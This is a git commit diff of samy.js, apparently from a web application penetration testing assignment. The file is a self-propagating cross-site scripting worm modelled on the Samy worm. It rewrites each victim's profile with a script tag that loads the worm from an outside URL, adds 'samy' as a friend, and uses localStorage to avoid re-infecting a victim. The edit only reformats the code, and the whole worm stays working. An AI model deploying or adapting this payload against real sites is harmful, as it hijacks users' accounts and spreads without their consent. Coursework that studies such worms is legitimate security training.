ee6530bea138b290f61e8c192789c0bf53b5f67d
DasMeAyy <64674439+gjh0239@users.noreply.github.com>
2024-07-05 10:21:52 +0800

    Update samy.js

--- samy.js
+++ samy.js
@@ -1,33 +1,31 @@
-<script>
-	function updateProfile() {
-		payload = "\<script" + " src=\"https://github.com/gjh0239/WAPT-Assignment-1/blob/main/samy.js\"\>" + "\<\/script\>";
+function updateProfile() {
+	payload = "\<script" + " src=\"https://github.com/gjh0239/WAPT-Assignment-1/blob/main/samy.js\"\>" + "\<\/script\>";
 
-		fetch("/profile/update", {
-			method: "POST",
-			headers: {
-				"Content-Type": "application/json",
-			},
-			body: JSON.stringify({ "content": payload+"Samy is the hero!"})
-		})
-	}
+	fetch("/profile/update", {
+		method: "POST",
+		headers: {
+			"Content-Type": "application/json",
+		},
+		body: JSON.stringify({ "content": payload+"Samy is the hero!"})
+	})
+}
+
+function addFriend() {
+	fetch("/friend", {
+		method: "POST",
+		headers: {
+			"Content-Type": "application/json",
+		},
+		body: JSON.stringify({ friend: "samy" })
+	})
+}
+
+const usernameTag = document.getElementById("username");
+if (usernameTag.textContent !== "samy" && !localStorage.getItem(usernameTag.textContent)){
+	const username = usernameTag.querySelector("strong").innerText.trim();
+updateProfile();
+addFriend();
 	
-	function addFriend() {
-		fetch("/friend", {
-			method: "POST",
-			headers: {
-				"Content-Type": "application/json",
-			},
-			body: JSON.stringify({ friend: "samy" })
-		})
-	}
-
-	const usernameTag = document.getElementById("username");
-    if (usernameTag.textContent !== "samy" && !localStorage.getItem(usernameTag.textContent)){
-		const username = usernameTag.querySelector("strong").innerText.trim();
-    	updateProfile();
-    	addFriend();
-		
-		// prevent re-infection of victim
-		localStorage.setItem(usernameTag.textContent, true);
-	}
-</script>
+	// prevent re-infection of victim
+	localStorage.setItem(usernameTag.textContent, true);
+}
